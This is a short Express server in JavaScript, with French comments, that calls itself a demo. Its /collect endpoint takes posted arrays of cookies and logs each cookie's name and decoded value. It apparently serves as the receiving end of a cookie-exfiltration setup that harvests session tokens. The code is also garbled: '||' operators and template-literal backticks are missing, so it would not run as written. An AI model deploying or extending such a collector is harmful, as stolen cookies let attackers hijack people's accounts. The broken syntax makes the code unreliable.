const express = require('express');
const app = express();

// Configuration du port pour Render
const PORT = process.env.PORT  3000;

// Middleware pour lire le JSON (indispensable)
app.use(express.json());

// Route de test pour vérifier que le serveur est vivant
app.get("/", (req, res) => {
  res.send("Serveur de démo opérationnel !");
});

app.post("/collect", (req, res) => {
  // Debug : voir ce qui arrive dans la console de Render
  console.log("Données reçues (req.body) :", req.body);

  const cookies = req.body.cookies;

  console.log("\n===== ANALYSE DES COOKIES =====");

  if (!cookies  !Array.isArray(cookies)) {
    console.log("❌ Erreur : 'cookies' n'est pas un tableau ou est absent.");
    return res.status(400).json({ 
      status: "error", 
      message: "Format invalide. 'cookies' doit être un tableau dans un objet JSON." 
    });
  }

  if (cookies.length === 0) {
    console.log("⚠️ Le tableau est vide.");
  } else {
    cookies.forEach(cookie => {
      const name = cookie.name || "Inconnu";
      const value = cookie.value ? decodeURIComponent(cookie.value) : "vide";
      console.log(🍪 ${name} : ${value});
    });
  }

  console.log("===============================\n");

  res.json({ status: "ok", received: cookies.length });
});

// Lancement du serveur
app.listen(PORT, () => {
  console.log(🚀 Serveur démarré sur le port ${PORT});
});
